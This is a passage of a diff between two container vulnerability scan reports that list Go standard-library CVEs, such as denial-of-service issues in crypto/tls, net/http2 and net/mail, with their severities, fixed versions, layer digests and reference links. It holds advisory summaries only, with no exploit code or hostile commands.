 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32283 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:2ec2b75f561cfa73766ca019f46266a346037a622750895c8eb81057048ab4b0 
+│     │      ├ Fingerprint     : sha256:1d185ea797bf9f8ed255cfebb9910607731b83a4a28939c866697ec1005fa23d 
 │     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Denial of Service via multiple TLS 1.3 key
 │     │      │                   update messages 
 │     │      ├ Description     : If one side of the TLS connection sends multiple key update messages
@@ -4280,7 +3873,7 @@
 │     │      │                  ├ [115]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
 │     │      │                  ├ [116]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
 │     │      │                  ├ [117]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
-│     │      │                  ├ [118]: https://errata.almalinux.org/9/ALSA-2026-29703.html 
+│     │      │                  ├ [118]: https://errata.almalinux.org/10/ALSA-2026-29195.html 
 │     │      │                  ├ [119]: https://errata.rockylinux.org/RLSA-2026:29703 
 │     │      │                  ├ [120]: https://go.dev/cl/763767 
 │     │      │                  ├ [121]: https://go.dev/issue/78334 
@@ -4303,14 +3896,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:3e973b282cb15f204b02e789ddc0f9117e5faaf0c5bcd1d12cb962eb18723dc5 
+│     │      ├ Fingerprint     : sha256:8a7637dfa5192803ca7f144e4610e15db017179b0a47f7286223a393f3abace3 
 │     │      ├ Title           : net: golang: Go net package: Denial of Service via long CNAME response in
 │     │      │                   LookupCNAME 
 │     │      ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
@@ -4394,20 +3987,22 @@
 │     │      │                  ├ [59]: https://access.redhat.com/errata/RHSA-2026:48151 
 │     │      │                  ├ [60]: https://access.redhat.com/security/cve/CVE-2026-33811 
 │     │      │                  ├ [61]: https://bugzilla.redhat.com/2467822 
-│     │      │                  ├ [62]: https://bugzilla.redhat.com/show_bug.cgi?id=2467822 
-│     │      │                  ├ [63]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33811 
-│     │      │                  ├ [64]: https://errata.almalinux.org/9/ALSA-2026-39319.html 
-│     │      │                  ├ [65]: https://errata.rockylinux.org/RLSA-2026:39319 
-│     │      │                  ├ [66]: https://go.dev/cl/767860 
-│     │      │                  ├ [67]: https://go.dev/issue/78803 
-│     │      │                  ├ [68]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
-│     │      │                  ├ [69]: https://linux.oracle.com/cve/CVE-2026-33811.html 
-│     │      │                  ├ [70]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
-│     │      │                  ├ [71]: https://nvd.nist.gov/vuln/detail/CVE-2026-33811 
-│     │      │                  ├ [72]: https://pkg.go.dev/vuln/GO-2026-4981 
-│     │      │                  ├ [73]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33811
+│     │      │                  ├ [62]: https://bugzilla.redhat.com/2480756 
+│     │      │                  ├ [63]: https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [64]: https://bugzilla.redhat.com/show_bug.cgi?id=2467822 
+│     │      │                  ├ [65]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33811 
+│     │      │                  ├ [66]: https://errata.almalinux.org/10/ALSA-2026-39573.html 
+│     │      │                  ├ [67]: https://errata.rockylinux.org/RLSA-2026:39319 
+│     │      │                  ├ [68]: https://go.dev/cl/767860 
+│     │      │                  ├ [69]: https://go.dev/issue/78803 
+│     │      │                  ├ [70]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
+│     │      │                  ├ [71]: https://linux.oracle.com/cve/CVE-2026-33811.html 
+│     │      │                  ├ [72]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
+│     │      │                  ├ [73]: https://nvd.nist.gov/vuln/detail/CVE-2026-33811 
+│     │      │                  ├ [74]: https://pkg.go.dev/vuln/GO-2026-4981 
+│     │      │                  ├ [75]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33811
 │     │      │                  │       .json 
-│     │      │                  ╰ [74]: https://www.cve.org/CVERecord?id=CVE-2026-33811 
+│     │      │                  ╰ [76]: https://www.cve.org/CVERecord?id=CVE-2026-33811 
 │     │      ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:17:54.743Z 
 │     ├ [27] ╭ VulnerabilityID : CVE-2026-33814 
@@ -4419,14 +4014,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:5864f19f223914932c33e715ea55f67eb7a5e4d7246d68270dd8bc2c2a9607ae 
+│     │      ├ Fingerprint     : sha256:3ebc569e01e003e45eddca65139ac01da84f78b3c47a7bbed8ba92a217e65d9b 
 │     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
 │     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
 │     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
@@ -4490,14 +4085,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:9a9f40b2a6b8b94f9681469bdf90814da620e06debed47db070760a6f39804a0 
+│     │      ├ Fingerprint     : sha256:e47472696adf97321adaf7eea2ddfe431ba1d57e0621cf2052ccc7bc1677c7bb 
 │     │      ├ Title           : net/mail: golang: Go net/mail: Denial of Service via crafted email inputs 
 │     │      ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate
 │     │      │                   were able to trigger excessive CPU exhaustion and memory allocations. 
@@ -4562,13 +4157,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:85390a7640739a69b4264890526f499b2339bcc2a03fde19e77350fc907ff85b 
+│     │      ├ Fingerprint     : sha256:87dec4d8ea0d83316018520bed15132d316ab511c18e686720e9e656eb6f09d9 
 │     │      ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
 │     │      │                   traversal 
 │     │      ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
@@ -4588,12 +4183,12 @@
 │     │      │                  │         ╰ V3Score : 7.8 
 │     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
 │     │      │                            ╰ V3Score : 7.8 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38495 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
 │     │      │                  ├ [2] : https://bugzilla.redhat.com/2498152 
 │     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
 │     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
+│     │      │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2026-38495.html 
 │     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
 │     │      │                  ├ [7] : https://go.dev/cl/797880 
 │     │      │                  ├ [8] : https://go.dev/issue/79005 
@@ -4614,15 +4209,16 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:d5f9cfbe94ffbf470bedc9572ac907ea6212c6151c42a6ceaefad16899f13cf8 
-│     │      ├ Title           : ELSA-2026-22121:  golang security update (IMPORTANT) 
+│     │      ├ Fingerprint     : sha256:12f3b57f88f8543d763f8f340ea4b15f779efbbe3a6fdb0d188c02e393c06be7 
+│     │      ├ Title           : net: golang: Go net package: Denial of Service via NUL byte in Dial and
+│     │      │                   LookupPort on Windows 
 │     │      ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
 │     │      │                    containing a NUL (0). 
 │     │      ├ Severity        : HIGH 
@@ -4630,18 +4226,23 @@
 │     │      ├ VendorSeverity   ╭ bitnami    : 3 
 │     │      │                  ├ nvd        : 3 
 │     │      │                  ├ oracle-oval: 3 
-│     │      │                  ╰ photon     : 3 
+│     │      │                  ├ photon     : 3 
+│     │      │                  ╰ redhat     : 2 
 │     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
 │     │      │                  │         ╰ V3Score : 7.5 
-│     │      │                  ╰ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
+│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
+│     │      │                  │         ╰ V3Score : 7.5 
+│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
 │     │      │                            ╰ V3Score : 7.5 
-│     │      ├ References       ╭ [0]: https://go.dev/cl/775320 
-│     │      │                  ├ [1]: https://go.dev/issue/79006 
-│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
-│     │      │                  ├ [3]: https://linux.oracle.com/cve/CVE-2026-39836.html 
-│     │      │                  ├ [4]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
-│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-39836 
-│     │      │                  ╰ [6]: https://pkg.go.dev/vuln/GO-2026-4971 
+│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-39836 
+│     │      │                  ├ [1]: https://go.dev/cl/775320 
+│     │      │                  ├ [2]: https://go.dev/issue/79006 
+│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
+│     │      │                  ├ [4]: https://linux.oracle.com/cve/CVE-2026-39836.html 
+│     │      │                  ├ [5]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
+│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-39836 
+│     │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2026-4971 
+│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-39836 
 │     │      ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
 │     │      ╰ LastModifiedDate: 2026-06-17T10:42:40.34Z 
 │     ├ [31] ╭ VulnerabilityID : CVE-2026-42499 
@@ -4653,13 +4254,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.10, 1.26.3 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:5e0bc88b491e1d395f0285d5f90a2d105e9d20a2b5e4b5f34e18edfef7d06fba 
+│     │      ├ Fingerprint     : sha256:e91c4405e925c4d453ba0be356d465a4a1a9f82d65a3defcceb2ae04de100886 
 │     │      ├ Title           : net/mail: golang: net/mail: Denial of Service via pathological email address
 │     │      │                   parsing 
 │     │      ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an
@@ -4721,13 +4322,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:9d74e186bca7b7c0eca1e45f9b8dd1fe16e63d86826ffb0335707936345def3e 
+│     │      ├ Fingerprint     : sha256:837dd8616fb5ca251d81e74d6551e00fc65d2fbcedf0756657414a21a2728694 
 │     │      ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
 │     │      ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
 │     │      │                   encoded-words can consume excessive CPU. 
@@ -4759,13 +4360,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.8, 1.26.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27142 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:0d7402fd0c2ea6a245a768ad44c15d2aea5160cf763dc9100bd97ac6a9d6b2bf 
+│     │      ├ Fingerprint     : sha256:e2dc4a118d5246ae1a5ee179cacd067bcb0cace4376cc283335d48e4db7d0cf9 
 │     │      ├ Title           : html/template: URLs in meta content attribute actions are not escaped in
 │     │      │                   html/template 
 │     │      ├ Description     : Actions which insert URLs into the content attribute of HTML meta tags are not
@@ -4802,14 +4403,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.9, 1.26.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32282 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:af6c071a3cbaeed0da1e46099abce11a7873293255594494fa028db5756a459b 
+│     │      ├ Fingerprint     : sha256:b21fa18509f9130402f00c88447b64b6a1468e9eaca14990577d331d0a0636b0 
 │     │      ├ Title           : golang: internal/syscall/unix: Root.Chmod can follow symlinks out of the root 
 │     │      ├ Description     : On Linux, if the target of Root.Chmod is replaced with a symlink while the
 │     │      │                   chmod operation is in progress, Chmod can operate on the target of the
@@ -4821,7 +4422,7 @@
 │     │      │                    the check and operation. 
 │     │      ├ Severity        : MEDIUM 
 │     │      ├ CweIDs           ─ [0]: CWE-59 
-│     │      ├ VendorSeverity   ╭ alma       : 3 
+│     │      ├ VendorSeverity   ╭ alma       : 2 
 │     │      │                  ├ amazon     : 3 
 │     │      │                  ├ bitnami    : 2 
 │     │      │                  ├ nvd        : 2 
@@ -4835,42 +4436,38 @@
 │     │      │                  │         ╰ V3Score : 6.4 
 │     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H 
 │     │      │                            ╰ V3Score : 7.8 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:19353 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:22141 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32282 
-│     │      │                  ├ [2] : https://bugzilla.redhat.com/2445356 
-│     │      │                  ├ [3] : https://bugzilla.redhat.com/2449833 
-│     │      │                  ├ [4] : https://bugzilla.redhat.com/2455470 
-│     │      │                  ├ [5] : https://bugzilla.redhat.com/2456333 
-│     │      │                  ├ [6] : https://bugzilla.redhat.com/2456335 
-│     │      │                  ├ [7] : https://bugzilla.redhat.com/2456336 
-│     │      │                  ├ [8] : https://bugzilla.redhat.com/2456338 
-│     │      │                  ├ [9] : https://bugzilla.redhat.com/2456339 
-│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2434432 
-│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2437111 
-│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2445345 
-│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
-│     │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2449833 
-│     │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
-│     │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
-│     │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
-│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-61726 
-│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-68121 
-│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
-│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27137 
-│     │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
-│     │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
-│     │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33186 
-│     │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
-│     │      │                  ├ [26]: https://errata.almalinux.org/9/ALSA-2026-19353.html 
-│     │      │                  ├ [27]: https://errata.rockylinux.org/RLSA-2026:23228 
-│     │      │                  ├ [28]: https://go.dev/cl/763761 
-│     │      │                  ├ [29]: https://go.dev/issue/78293 
-│     │      │                  ├ [30]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
-│     │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-32282.html 
-│     │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-25999.html 
-│     │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
-│     │      │                  ├ [34]: https://pkg.go.dev/vuln/GO-2026-4864 
-│     │      │                  ╰ [35]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
+│     │      │                  ├ [2] : https://bugzilla.redhat.com/2437111 
+│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456333 
+│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456336 
+│     │      │                  ├ [5] : https://bugzilla.redhat.com/2456339 
+│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2434432 
+│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2437111 
+│     │      │                  ├ [8] : https://bugzilla.redhat.com/show_bug.cgi?id=2445345 
+│     │      │                  ├ [9] : https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
+│     │      │                  ├ [10]: https://bugzilla.redhat.com/show_bug.cgi?id=2449833 
+│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
+│     │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
+│     │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
+│     │      │                  ├ [14]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-61726 
+│     │      │                  ├ [15]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-68121 
+│     │      │                  ├ [16]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
+│     │      │                  ├ [17]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27137 
+│     │      │                  ├ [18]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
+│     │      │                  ├ [19]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
+│     │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33186 
+│     │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
+│     │      │                  ├ [22]: https://errata.almalinux.org/10/ALSA-2026-22141.html 
+│     │      │                  ├ [23]: https://errata.rockylinux.org/RLSA-2026:23228 
+│     │      │                  ├ [24]: https://go.dev/cl/763761 
+│     │      │                  ├ [25]: https://go.dev/issue/78293 
+│     │      │                  ├ [26]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
+│     │      │                  ├ [27]: https://linux.oracle.com/cve/CVE-2026-32282.html 
+│     │      │                  ├ [28]: https://linux.oracle.com/errata/ELSA-2026-25999.html 
+│     │      │                  ├ [29]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
+│     │      │                  ├ [30]: https://pkg.go.dev/vuln/GO-2026-4864 
+│     │      │                  ╰ [31]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
 │     │      ├ PublishedDate   : 2026-04-08T02:16:03.467Z 
 │     │      ╰ LastModifiedDate: 2026-07-25T10:10:00.167Z 
 │     ├ [35] ╭ VulnerabilityID : CVE-2026-32288 
@@ -4882,14 +4479,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.9, 1.26.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32288 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:456dc8ae394f365f658a7628e7061bad489ad0c9bbe8511f97e71831ac17d486 
+│     │      ├ Fingerprint     : sha256:44bda31993a4c3d3fdc6355b282017b989858f9e41d93502472253af1a3276b8 
 │     │      ├ Title           : archive/tar: golang: Go's archive/tar package: Denial of Service via
 │     │      │                   maliciously-crafted archive 
